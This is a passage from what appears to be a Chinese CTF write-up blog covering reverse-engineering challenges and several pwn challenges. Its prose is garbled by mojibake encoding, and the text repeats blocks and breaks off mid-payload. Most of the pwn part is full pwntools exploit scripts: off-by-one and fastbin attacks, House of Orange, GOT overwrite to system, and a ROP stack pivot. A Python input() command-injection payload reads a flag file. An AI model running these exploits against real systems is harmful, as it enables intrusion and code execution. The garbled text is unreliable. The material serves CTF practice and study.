&gt; 0x11 8 &gt; 0x50 9&gt; 0x90 0 &gt; 0x52 a &gt; 0x9e c &gt; 0x1e d &gt; 0x5d s &gt; 0x22 - &gt; 0x8b f &gt; 0xdd l &gt; 0x5b a &gt; 0x9e g &gt; 0x1d key = [0xDD, 0x5B, 0x9E, 0x1D, 0x20, 0x9E, 0x90, 0x91, 0x90, 0x90, 0x91, 0x92, 0xDE, 0x8B, 0x11, 0xD1, 0x1E, 0x9E, 0x8B, 0x51, 0x11, 0x50, 0x51, 0x8B, 0x9E, 0x5D, 0x5D, 0x11, 0x8B, 0x90, 0x12, 0x91, 0x50, 0x12, 0xD2, 0x91, 0x92, 0x1E, 0x9E, 0x90, 0xD2, 0x9F] ç„¶åè¿›è¡Œä¸€ä½ä½æ›¿æ¢ï¼Œè·å¾—flagï¼š flag&#123;a959951b-76ca-4784-add7-93583251ca92&#125; ä¸»ç¨‹åºå¾ˆç®€å•ï¼Œè¦æ±‚è¾“å…¥42ä½çš„flagã€‚ Handles = CreateThread(0, 0, StartAddress, 0, 0, 0); v5 = CreateThread(0, 0, loc_401200, 0, 0, 0); CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401240, 0, 0, 0); WaitForMultipleObjects(2u, &amp;Handles, 1, 0xFFFFFFFF); å¼€å§‹æ–°çš„çº¿ç¨‹ï¼š void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter) &#123; while ( !IsDebuggerPresent() ) ; puts((int)\"debug!\\n\"); exit(0); &#125; è¿™æœ‰ä¸€ä¸ªåè°ƒè¯•ã€‚ç”¨çš„IsDebuggerPresentï¼Œè¿‡çš„åŠæ³•å¾ˆç®€å•ï¼Œåœ¨x64dbgä¸­åœ¨è¿›å…¥IsDebuggerPresentæ—¶ï¼Œè¾“å…¥dbhï¼Œéšè—è°ƒè¯•å™¨å³å¯ã€‚ æµ‹è¯•åœ¨è¿™é‡Œdbhå³å¯ã€‚ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼è¿˜æœ‰å¯¹ä½ çš„inputè¿›è¡Œå¤„ç†ï¼Œå¤„ç†å®Œä»¥åä¸ è¿™42ä¸ªæ•°æ®è¿›è¡Œå¯¹æ¯”ã€‚ å…ˆè¿‡äº†åè°ƒè¯•ï¼Œå®šä½å…³é”®å¤„ç†è¾“å…¥çš„ä»£ç å¤„ï¼ˆ0x401223ï¼‰ï¼Œè¿›è¡Œç¡®å®šå…¶æ˜¯æ€ä¹ˆæ“ä½œæ•°æ®çš„ï¼Œçœ‹äº†ä¸€ä¼šå‘ç°æ²¡æœ‰å¦‚æ­¤ç®€å•ï¼Œä½†æ˜¯å‘ç°ä½ è¾“å…¥ç‰¹å®šå­—ç¬¦ï¼Œç»è¿‡ç¨‹åºå¤„ç†å‡ºæ¥çš„éƒ½æ˜¯ä¸€æ ·çš„: éšæ„è¾“å…¥flag{==2332311111111111111111122222222211} å¯ä»¥æ‰“å°å­—ç¬¦ä¸ç®—å¤šï¼Œè¿™å°±å¯ä»¥å¯ä»¥å»ºç«‹ä¸€ä¸ªæ˜ å°„è¡¨ï¼šè¾“å…¥flag{1234567890qwertyuiopasdfghjkbnmmmmmm} å¤„ç†å®Œï¼šè·å–æ˜ å°„è¡¨ï¼š 1 &gt; 0x92 2 &gt; 0xd2 3 &gt; 0x12 4 &gt; 0x51 5 &gt; 0x91 6 &gt; 0xd1 7 &gt; 0x11 8 &gt; 0x50 9&gt; 0x90 0 &gt; 0x52 f &gt; 0xdd l &gt; 0x5b a &gt; 0x9e g &gt; 0x1d a &gt; 0x9e c &gt; 0x1e d &gt; 0x5d s &gt; 0x22 - &gt; 0x8b æå–ä¸€ä¸‹keyï¼š key = [0xDD, 0x5B, 0x9E, 0x1D, 0x20, 0x9E, 0x90, 0x91, 0x90, 0x90, 0x91, 0x92, 0xDE, 0x8B, 0x11, 0xD1, 0x1E, 0x9E, 0x8B, 0x51, 0x11, 0x50, 0x51, 0x8B, 0x9E, 0x5D, 0x5D, 0x11, 0x8B, 0x90, 0x12, 0x91, 0x50, 0x12, 0xD2, 0x91, 0x92, 0x1E, 0x9E, 0x90, 0xD2, 0x9F] ç„¶åè¿›è¡Œä¸€ä½ä½æ›¿æ¢ï¼Œè·å¾—flagï¼š flag&#123;a959951b-76ca-4784-add7-93583251ca92&#125; æ–¹æ³•äºŒå¯ä»¥ç¡®å®šä¸€ä¸‹idaæ— æ³•è¯†åˆ«çš„æ•°æ®æ®µï¼Œæ˜¯è¢«èŠ±æŒ‡ä»¤å¤„ç†è¿‡äº†ã€‚è¿™é‡Œå¼€å§‹å¾€ä¸‹è¯†åˆ«å¼‚å¸¸ï¼Œåœ¨åŠ¨æ€è°ƒè¯•åï¼Œæå–ä¸€ä¸‹æ­£ç¡®çš„æ±‡ç¼–ä»£ç ï¼Œæ ¹æ®æ­£ç¡®çš„ç®—æ³•è¿›è¡Œpatchæ‰èŠ±æŒ‡ä»¤ã€‚ï¼ˆè¿˜æ˜¯æ³¨æ„dbhéšè—ä¸€ä¸‹è°ƒè¯•å™¨ã€‚ï¼‰ void __stdcall __noreturn sub_401120(LPVOID lpThreadParameter) &#123; int v1; // ebx CreateThread(0, 0, hHandle, 0, 0, 0); WaitForSingleObject(hHandle, 0xFFFFFFFF); inputs[0] = (inputs[0] &lt;&lt; 6) ^ ((signed int)(unsigned __int8)inputs[0] &gt;&gt; 2); inputs[0] ^= 0x23u; Sleep(6u); v1 = *(unsigned __int8 *)(__readfsdword(0x30u) + 2); inputs[0] += 0x23; JUMPOUT(loc_4011EC); &#125; Patch åçš„ï¼Œå‹‰å¼ºå¯ä»¥çœ‹æ‡‚ã€‚å…¶ä¸­è‚¯å®šæ˜¯inputs[i]è¿›è¡Œå¤„ç†çš„ï¼Œå…¶ä¸­ä¹Ÿæœ‰ä¸€ä¸ªåœ°æ–¹åœ¨åŠ 1ã€‚ key = [ 0xDD, 0x5B, 0x9E, 0x1D, 0x20, 0x9E, 0x90, 0x91, 0x90, 0x90, 0x91, 0x92, 0xDE, 0x8B, 0x11, 0xD1, 0x1E, 0x9E, 0x8B, 0x51, 0x11, 0x50, 0x51, 0x8B, 0x9E, 0x5D, 0x5D, 0x11, 0x8B, 0x90, 0x12, 0x91, 0x50, 0x12, 0xD2, 0x91, 0x92, 0x1E, 0x9E, 0x90, 0xD2, 0x9F ] flag = '' for i in range(len(key)): key[i] -= 0x23 key[i] &amp;= 0xff #æœ‰å¯èƒ½è¿ç®—åä¼šå°äº0çš„ï¼Œæ‰€ä»¥ç»™å¤„ç†ä¸€ä¸‹ key[i] ^= 0x23 key[i] = ((key[i] &gt;&gt; 6) ^ (key[i] &lt;&lt; 2)) &amp; 0xff flag += chr(key[i]) print(flag) pwneasyboxåˆ†æubuntu 16ï¼Œoff by oneï¼Œæ²¡æœ‰showå‡½æ•°ï¼Œéœ€è¦æ”»å‡»stdoutæ³„æ¼libcåœ°å€ã€‚ åˆ©ç”¨ ç”¨off by oneï¼Œæ„é€ å‡ºchunk overlapping ,å¹¶ä¸”æƒ³åŠæ³•é‡Šæ”¾å †å—ï¼Œè®©main_arena_è½åœ¨fastbinä¸­ ä¿®æ”¹è¿™ä¸ªmain_arena_çš„æœ€å2ä¸ªå­—èŠ‚ï¼Œè®©å…¶æŒ‡å‘stdouté™„è¿‘å¸¦æœ‰0x7fçš„åœ°å€ï¼ˆå±äº0x70çš„fastbinå †å—ï¼‰ ä½¿ç”¨chunk overlapping ï¼Œæ¥ä¿®æ”¹ç©ºé—²çš„fastbin chainï¼Œä½¿å…¶ä¸­ä¸€ä¸ªæŒ‡å‘è¿™ä¸ªå¸¦æœ‰main_arenaçš„å †å—ï¼Œè¿›è¡Œfastbin attackï¼Œä¿®æ”¹åˆ°stdoutå¤„çš„å†…å®¹ï¼Œleak libc é‡å¤ä»¥ä¸Šçš„æ­¥éª¤ï¼Œæ„é€ ä¸€ä¸ªå †å—åˆ°malloc_hookå¤„ï¼Œå†™ä¸Šone gadget å³å¯ã€‚ expfrom pwn import * import time local_file = './pwn' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('101.200.53.148',34521) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def alloca(idx,size,data): sla(\"&gt;\",'1') sla('idx',str(idx)) sla('len',str(size)) sa('content',str(data)) def free(idx): sla('&gt;&gt;&gt;','2') sla('idx',str(idx)) # def pwn(): def leak_addr(): alloca(0,1,'aa') alloca(1,0x4f0,'\\xdd\\xd5') alloca(2,0xb0,'aa') alloca(3,0x60,'aa') free(0) alloca(0,0x18,'/bin/sh\\x00'*2 + p64(0) + '\\xc1') free(1) alloca(1,0x60,'\\xdd\\xd5') alloca(4,0x60,'\\x50\\x47') alloca(5,0x60,'\\x50\\x47') alloca(6,0x60,'\\x50\\x47') alloca(7,0x30,'aa') alloca(8,0x160,'aaaaaa') alloca(9,0x60,'aa') alloca(10,0x30,'aa') free(7) alloca(0,0x38, p64(0) * 7 + '\\xe1') free(8) free(4) free(9) free(5) payload = 'a' * 0x160 alloca(11,0x180,payload) payload = 'a' * 0x160 + p64(0) + p64(0x71) + '\\x20' alloca(11,0x180,payload) alloca(12,0x60,' ') # debug() alloca(13,0x60,' ') alloca(14,0x60,'\\xed\\xca') payload = 'a' * 3 + p64(0) * 6 + p64(0xfbad3c80)+p64(0)*3+p8(0) alloca(15,0x60,payload) # leak_addr() leak = 0 while True: try: leak_addr() ss = io.recvuntil(chr(0x7f),timeout = 0.5) if len(ss) == 0: raise Exception('') io.recv(10) leak = uu64(r(6)) if leak == 0x7ff81b57b6a3: raise Exception('') break except Exception: io.close() io = process('./pwn') # io = remote('101.200.53.148',34521) continue info_addr('leak',leak) libc_base = leak - 0x3c56a3 info_addr('libc_base',libc_base) rec = 0xf1207 + libc_base def getshell(): alloca(7,0x60,' ') alloca(8,0x60,' ') free(0) free(11) free(6) alloca(5,0x60,' ') alloca(4,0x60,' ') alloca(0,0x60,'\\xed\\xca') free(4) free(13) free(12) payload = 'a' * 0x80 + p64(0) + p64(0x71) + '\\x90' alloca(13,0x90,payload) alloca(11,0x60,'\\x20\\xd0') alloca(6,0x60,'\\x20\\xd0') alloca(4,0x60,'\\x20\\xd0') payload = 'a' * 3 + p64(0) * 2 + p64(rec) alloca(5,0x60,payload) # debug() sleep(0.1) # alloca(8,30,'1') getshell() itr() æ·±å¤œå†™çš„expï¼Œä¼°è®¡æ„é€ å †å—çš„æ€è·¯æœ‰ç‚¹æ··ä¹±ã€‚ğŸ¤£ğŸ¤£ babyjscæ¯”èµ›æ—¶æ²¡æœ‰åšå‡ºæ¥ï¼Œå¼€å§‹ä»¥ä¸ºæ˜¯ä¸ªwebpwnï¼Œä¸æ•¢å»åšã€‚ä½†æ˜¯å¾ˆå¤šé˜Ÿä¼åšå‡ºæ¥äº†ï¼Œè¯•ç€å»åšï¼Œçœ‹åˆ°server.py,ä¸äº†è§£jscï¼Œä»¥ä¸ºåªèƒ½æ‰§è¡Œjsä»£ç ï¼ŒåºŸäº†å¾ˆå¤§ç²¾åŠ›å†™jsæ¥è¯»å–flagï¼Œè¿˜æ˜¯æ²¡æœ‰æˆåŠŸã€‚tclã€‚ æœ€åçœ‹wpï¼ŒçŸ¥é“äº†inputå‡½æ•°æœ¬èº«å°±æ˜¯ä¸ªæ¼æ´å‡½æ•°ï¼Œå…¶ä¼šå°†stdinè¾“å…¥çš„å†…å®¹å½“åšpythonä»£ç å»æ‰§è¡Œï¼ˆå°±åƒæ‰§è¡Œè®¡ç®—å¼ä¸€æ ·ï¼Œå°†å…¶çœ‹åšpythonä»£ç ï¼Œé€šè¿‡è®¡ç®—è¿”å›ç»“æœï¼‰ã€‚å½“ç„¶å¯ä»¥ç”¨å®ƒæ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¸è¿‡éœ€è¦å…ˆå€’å…¥osçš„æ¨¡å—ï¼Œç„¶åæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ __import__('os').system('cat /home/ctf/flag') å¯¹äºpythonï¼Œinputå‡½æ•°æ¼æ´ï¼Œå‚è€ƒé“¾æ¥ï¼šhttps://blog.csdn.net/weixin_34221332/article/details/92713257 no freeåˆ†æ*] '/ctf/work/ciscn2020/pwn/nofree/pwn' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) å¯ä»¥çœ‹åˆ°ä¿æŠ¤å¼€çš„è¿˜æ˜¯å¾ˆå°‘çš„ï¼Œç„¶åno free æ˜æ˜¾éœ€è¦ä½¿ç”¨åˆ°hos of orangeè¿›è¡Œæ”»å‡»äº†ã€‚ addå‡½æ•° åªèƒ½ç”³è¯·0-0x90å¤§å°çš„å †å—ï¼Œå †å—å·è‡ªå®šä¹‰0-2ï¼Œä¸”ç”±äºæ²¡æœ‰å¯¹å·²ç»å­˜åœ¨çš„å †å—å·éªŒè¯ï¼Œå¯ä»¥è¿›è¡Œæ— é™æ¬¡çš„ç”³è¯·åŒä¸€ä¸ªåºå·çš„å †å—ã€‚ å †å—åœ°å€å­˜åœ¨äº0x06020C0 + 0x100 size è·Ÿåœ¨åé¢ã€‚ strdup ç›¸å½“äºmalloc(stren(s)) editå‡½æ•° å€˜è‹¥è¾“å…¥æ²¡æœ‰å­˜åœ¨çš„å †å—idxï¼Œç¨‹åºä¼šç›´æ¥è¿”å› read_diy(key[2 * idx + 0x20], (unsigned __int64)key[2 * idx + 0x21]); è¿™é‡Œç”±äºæ˜¯è¿™æ ·çš„åˆ¤æ–­ï¼Œç»“åˆaddçš„strdup å°±é€ æˆäº†å †æº¢å‡ºã€‚ æ”»å‡»æ€è·¯éš¾ç‚¹åŸºæœ¬å°±åœ¨æ³„æ¼libcäº†ã€‚ åˆ©ç”¨ç¨‹åºçš„å †æº¢å‡ºæ¼æ´ï¼Œä¿®æ”¹ä¸€ä¸‹top chunk ç”³è¯·å¤šæ¬¡0å·0x90çš„å †å—ï¼Œæ¥æ¶ˆè€—ä¿®æ”¹åçš„top chunkï¼Œåˆ°è¾¾ä¸€å®šç¨‹åº¦åè¿›è¡Œhos of orangeæ”»å‡»ï¼Œè·å–ä¸€ä¸ªç©ºé—²çš„è¿›å…¥fastbinçš„å †å— åˆ©ç”¨å †æº¢å‡ºï¼Œåœ¨fastbin chainä¸ŠåŠ ä¸€ä¸ª0x06020C0 + 0x100 ï¼Œå‡†å¤‡è¿›è¡Œfastbin attackï¼Œæ¥è·å–ä¸€ä¸ªåœ¨å­˜æ”¾å †å—åœ°å€çš„å †å—ï¼Œè¿™æ ·å°±å®ç°äº†ä»»æ„åœ°å€å†™ã€‚ ä¿®æ”¹atoi çš„got è¡¨ä¸º printfï¼Œåˆ›é€ å‡ºä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ åˆ©ç”¨addä¸­çš„atoiï¼Œå®Œæˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨ï¼Œæ³„æ¼å‡ºlibcåœ°å€ åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä¿®æ”¹atoi çš„gotè¡¨ä¸ºelf.plt[&#39;atoi&#39;] + 6 ï¼Œè®©å…¶å®Œæˆä¸€ä¸‹è§£æï¼Œé‡æ–°æ„é€ å‡ºæ­£å¸¸çš„atoiï¼ˆåŸå› ï¼šæµ‹é€Ÿä¸­å‘ç°ï¼Œç”¨editåŠŸèƒ½è¾“å…¥idxåç›´æ¥é€€å‡ºï¼Œåªèƒ½è®©å…¶æ¢å¤æ­£å¸¸ï¼Œå†è¿›è¡Œä»»æ„åœ°å€å†™ï¼‰ ä¿®æ”¹atoi çš„gotä¸ºsystemçš„åœ°å€ï¼Œç„¶ååœ¨å‘é€ä¸ªsh ï¼Œå®Œæˆsystem(sh) expfrom pwn import * import time local_file = './pwn' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27411) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,size,data): sla(\"&gt;\",'1') sla('idx',str(idx)) sla('size',str(size)) sa('content',str(data)) def edit(idx,data): sla('&gt;','2') sla('idx',str(idx)) sa(\"content\",str(data)) payload = 'a' * 0x40 add(0,0x90,payload) payload = 'a' * 0x40 + p64(0) + p64(0xfb1) edit(0,payload) payload = 'a' * 0x90 for i in range(24): add(0,0x90,payload) payload = 'a' * 0x10 add(1,0x90,payload) payload = 'a' * 0x70 add(0,0x70,payload) payload = '\\x00' * 0x18 + p64(0x71) + p64(0x6020C0 + 0x100) edit(1,payload) payload = 0x60 * 'a' add(0,0x70,payload) add(0,0x90,payload) payload = p64(0x0000000000602058) + p64(0x90) edit(0,payload) edit(1,p64(elf.plt['printf'])) sla('&gt;&gt;','1') payload = 'aaaa%7$s' + p64(0x000000000602018) sa('idx',payload) r(4) r(4) libc_base = uu64(r(6)) - libc.sym['puts'] info_addr('libc_base',libc_base) sys = libc_base + libc.sym['system'] sla('&gt;&gt;','1') payload = 'aaaa%82c' + '%8$hhn11' + p64(0x000000000602058) sa('idx',payload) edit(1,p64(sys)) s('sh') itr()","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://chumen77.xyz/tags/re/"},{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"}]},{"title":"å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®","slug":"æ— æ ‡é¢˜","date":"2020-08-16T11:12:38.871Z","updated":"2020-08-17T13:55:03.167Z","comments":true,"path":"2020/08/16/æ— æ ‡é¢˜/","link":"","permalink":"http://chumen77.xyz/2020/08/16/æ— æ ‡é¢˜/","excerpt":"","text":"å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®REIOT1ç¯å¢ƒæ­å»ºå‚è€ƒï¼šhttps://www.cnblogs.com/csnd/p/11800622.html æ³¨æ„ç½‘å¡é‚£å—ï¼Œè¦å¯¹åº”è‡ªå·±è™šæ‹Ÿæœºç½‘å¡çš„æƒ…å†µã€‚ å¯åŠ¨å‘½ä»¤ï¼šqemu-system-mipsel -M malta -hda openwrt-malta-le-root.ext4 -kernel openwrt-malta-le-vmlinux.elf -nographic -append \"root=/dev/sda console=tty50\" -net nic -net tap æŠŠè™šæ‹Ÿæœºä¸­è¦åˆ†æçš„mazeæ–‡ä»¶å–å‡ºæ¥scp -r /path/maze username@servername:/path ä½¿ç”¨ghidraè¿›è¡Œåˆ†æfgets(buf,0x28,_stdin); len = strlen(buf); uStack68 = 0x20; if (*(char *)((int)&amp;uStack68 + len + 3) == '\\n') &#123; *(undefined *)((int)&amp;uStack68 + len + 3) = 0; len = len - 1; &#125; if (len != 0x20) &#123; eorr(); &#125; è¿™ä¸€æ®µå¯ä»¥ç¡®å®šè®©è¾“å…¥çš„æ˜¯32ä¸ªå­—ç¬¦ã€‚ void FUN_004006f0(void) &#123; int i; int j; i = 0; while (i &lt; DAT_16) &#123; j = 0; while (j &lt; 8) &#123; maze[i * 8 + j] = (char)(((int)s_AMz1nG~#--Ma7e~_00411034[i] &amp; *(uint *)(&amp;DAT_00411044 + j * 4)) &gt;&gt; (7U - j &amp; 0x1f)); j = j + 1; &#125; i = i + 1; &#125; return; &#125; å¯ä»¥çœ‹åˆ°è¿·å®«æ˜¯åœ¨è¿è¡Œæ—¶æ ¹æ®éƒ¨åˆ†æ•°æ®ï¼Œæ¥ç”Ÿæˆçš„ã€‚å¹¶ä¸”å…¶ä¸­ä¸€è¡Œæ˜¯8ä¸ªæ•°æ®ï¼Œä¸€åˆ—æ˜¯16ä¸ªï¼Œä¸€å…±128ä¸ªæ•°æ®ã€‚ å¯ä»¥ä½¿ç”¨gdbï¼Œæ–­ç‚¹åœ¨è¿™ä¸ªå‡½æ•°ä¹‹åï¼ŒæŠŠè¿·å®«æå–å‡ºæ¥ã€‚æå–å‡ºæ¥çš„éƒ½æ˜¯0x1 å’Œ 0x0ç»„æˆçš„è¿·å®«ã€‚ è¿›å…¥æ§åˆ¶èµ°ä½çš„å‡½æ•°ï¼š heng = 1; shu = 0; pcStackX0 = param_1 è¿™ä¸ªåœ°æ–¹æ§åˆ¶è¯´ï¼Œèµ·å…ˆèµ·ç‚¹æ˜¯ç¬¬1è¡Œçš„ç¬¬2ä¸ªä½ç½®ã€‚ checkå‡½æ•°ï¼Œä¸»è¦æ˜¯çœ‹ä½ æ˜¯ä¸æ˜¯åœ¨ç§»åŠ¨åï¼Œèµ°åˆ°äº†0ä¸Šï¼Œèµ°åˆ°çš„è¯ï¼Œç¨‹åºå°±åˆ¤ä½ å¤±è´¥ã€‚ å¾€ä¸‹çœ‹ï¼Œå‘ç°ä¸»è¦åˆ¤æ–­ï¼š if (cVar1 != 'U') &#123; LAB_00400ad4: if ((heng == 1) &amp;&amp; (shu == 10)) &#123; uVar3 = 1; &#125; else &#123; uVar3 = 0; &#125; åœ¨è¿™ä¸€æ®µï¼Œå¯ä»¥ç¡®å®šèµ°åˆ°ç¬¬11åˆ—çš„ç¬¬2ä¸ªæ•°å­—å³å¯ã€‚ æå–è¿·å®«å›¾å¹¶å¤„ç†è„šæœ¬æå–data=\"AMz1nG~#--Ma7e~\" data2=[0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1] maze=[] lie=0 while lie&lt;15: hang=0 while hang&lt;8: # print(hex(ord(data[lie])&amp;data2[hang]),(7-hang&amp;0x1f)) maze.append((ord(data[lie])&amp;data2[hang])&gt;&gt;(7-hang&amp;0x1f)) hang+=1 lie+=1 print(maze) å°±è¿™è¿·å®«ï¼Œæˆ‘çœ‹äº†å¥½ä¸€ä¼šæ‰èƒ½èµ°å¥½ã€‚ğŸ¤£ğŸ¤£æœäº†è‡ªå·±ï¼Œè€ä»¥ä¸ºæ˜¯æ•°æ®æå–é”™äº†ã€‚ flag = md5&#123;DDRDDLDDRRRRRDRDDDDDLLDDLLLUUULU&#125; PWNbaby_canary_åˆ†ææ¼æ´ç‚¹ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥ç”¨æ¥æ³„æ¼ã€‚ æ ˆæº¢å‡ºï¼Œåªèƒ½1ä¸ªgadgetã€‚ éš¾ç‚¹æ ˆè¿ç§»åªèƒ½æº¢å‡ºä¸€ä¸ªgadgetï¼Œè‚¯å®šæ˜¯æ‰“æ ˆè¿ç§»ï¼Œä½†æ˜¯è·Ÿä»¥å¾€çš„æ ˆè¿ç§»ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸€ä¸ªgadgetåªèƒ½æº¢å‡ºåˆ°rbpï¼Œå¹¶ä¸èƒ½è¦†ç›–åˆ°ret addressï¼Œæ‰€ä»¥åªèƒ½è¦†ç›–å¥½rbpåï¼Œåˆ©ç”¨ç¨‹åºèµ°å‡ºè¿™ä¸ªå‡½æ•°åï¼Œå°†è¦ç»“æŸç¨‹åºæ—¶çš„leave ret ã€‚ ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯å› ä¸ºåœ¨èµ°è¿‡ä¸€æ¬¡ leave retæ—¶ï¼Œæ­¤æ—¶çš„rbpå·²ç»è¢«æ”¹äº†ï¼Œå†è¿‡ç¨‹åºçš„ç¬¬äºŒä¸ªleave ret å‰ï¼Œéœ€è¦è¿‡ä¸€ä¸‹canaryçš„æ£€æµ‹: [----------------------------------registers-----------------------------------] RAX: 0x0 RBX: 0x0 RCX: 0x0 RDX: 0x38 ('8') RSI: 0x7ffefee5e310 --&gt; 0x26c46b053d3e2f00 RDI: 0x0 RBP: 0x601198 --&gt; 0x26c46b053d3e2f00 RSP: 0x7ffefee5e350 --&gt; 0x7ffefee5e440 --&gt; 0x1 RIP: 0x4008de (mov rdx,QWORD PTR [rbp-0x8]) R8 : 0x7f0bb0977700 (0x00007f0bb0977700) R9 : 0x12 R10: 0x78 ('x') R11: 0x246 R12: 0x400680 (xor ebp,ebp) R13: 0x7ffefee5e440 --&gt; 0x1 R14: 0x0 R15: 0x0 EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x4008cf: mov eax,0x0 0x4008d4: call 0x4007de 0x4008d9: mov eax,0x0 =&gt; 0x4008de: mov rdx,QWORD PTR [rbp-0x8] 0x4008e2: xor rdx,QWORD PTR fs:0x28 0x4008eb: je 0x4008f2 0x4008ed: call 0x400600 &lt;__stack_chk_fail@plt&gt; çœ‹è¿™é‡Œï¼Œåœ¨å–æ•°å€¼æ—¶ï¼Œå…¶åœ¨ä½ è¿ç§»çš„bssæ®µè¯»å–æ•°å€¼åˆ°rdxè¿›è¡Œåˆ¤æ–­çš„ï¼Œæ‰€ä»¥åœ¨ç¬¬ä¸€æ¬¡å¾€bssæ®µè¯»çš„æ—¶å€™ï¼Œå¡«å……å¥½canaryçš„å€¼ã€‚ å¹¶ä¸”è¿™ä¸ªé¢˜ï¼Œåœ¨çœ‹gotè¡¨åˆ°bssæ®µçš„è·ç¦»ä¹Ÿæ˜¯å¾ˆè¿‘çš„ã€‚ æ‰€ä»¥åœ¨è¿ç§»çš„æ—¶å€™éœ€è¦æ³¨æ„ï¼Œä»æœ‰å®é™…æ„ä¹‰çš„å‡½æ•°ï¼ˆæ¯”å¦‚putsï¼‰å¼€å§‹å‰å°±å¾—æŠŠæ ˆæŠ¬é«˜ã€‚å¦åˆ™åœ¨è¿›å…¥libcçš„å†…éƒ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œä¼šå› ä¸ºå„ç§push pop è€Œä¿®æ”¹åˆ°gotå¤„çš„ä¸œè¥¿ï¼Œå¯¼è‡´ä¸ä»…æ³„æ¼çš„æ•°å€¼æœ‰é—®é¢˜ï¼Œå¹¶ä¸”å®¹æ˜“è®©ç¨‹åºå´©æ‰ã€‚ payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0) s.sendafter(\"canary ' s 5 0 n g :\",payload) payload = p64(canary)*6+p64(bss+0x100-8) s.sendafter(\"canary ' s h 0 m e :\",payload) s.recvline() puts = u64(s.recv(6).ljust(8,'\\x00')) success(hex(puts)) s.recvline() æ­¤å¤„å°±å¯ä»¥æ³„æ¼å‡ºputså‡½æ•°çš„libcåœ°å€ï¼Œä½†æ˜¯ç”±äºå‡ºé¢˜äººæƒ³è€ƒå¯Ÿret2dl_runtime_resolve,æ‰€ä»¥åº”è¯¥æ˜¯é­”æ”¹äº†libcã€‚ ç„¶åå¯ä»¥ä½¿ç”¨DynELFæ¥æå®šï¼Œå‚è€ƒç¾¤é‡Œå¸ˆå‚…åˆ†äº«çš„expã€‚ Dynelfå‡½æ•°æ€ä¹ˆå†™ç”±äºç¨‹åºåªæœ‰putså‡½æ•°æ¥è¾“å‡ºï¼Œå°±ç”¨putså‡½æ•°æ¥è¿›è¡Œæ³„æ¼ã€‚ payload = p64(0) * 57 +p64(canary) * 2 +p64(pop_rdi)+p64(address)+p64(puts_plt)+ p64(start_addr) æœ¬æ¥æˆ‘æ˜¯è¿™æ ·å†™çš„ï¼Œä½†æ˜¯å‘ç°ç¨‹åºè¿˜æ˜¯ä¼šå´©ï¼Œç”±äºç¨‹åºæƒ…å†µçš„é™åˆ¶ï¼Œæ ˆåªèƒ½æé«˜0x1b0è¿™æ ·ï¼Œè¿˜æ˜¯ä¸å¤Ÿç”¨ã€‚ è¿˜æ˜¯å°±æƒ³åŠæ³•æå‡æ ˆï¼Œå¾€é«˜ç‚¹çš„bssä¸Šå†™å…¥ropè¿›è¡Œæƒ³è¦çš„æ“ä½œã€‚ è¿™ä¸ªå°±åœ¨Dynelfå‰å†™å¥½,ç”¨ropæ§åˆ¶å‚æ•°ï¼Œè°ƒç”¨readå‡½æ•°æ¥å¾€é«˜ç‚¹çš„bssæ®µè¿›è¡Œå†™payloadï¼Œå¹¶ä¸”æœ€åç”¨pop rspçš„æ“ä½œï¼ŒæŠŠå†™å¥½rop chainçš„bssçš„åœ°å€pop åˆ°rspä¸Šï¼Œç„¶åå†retä¸Šå»ï¼š payload = 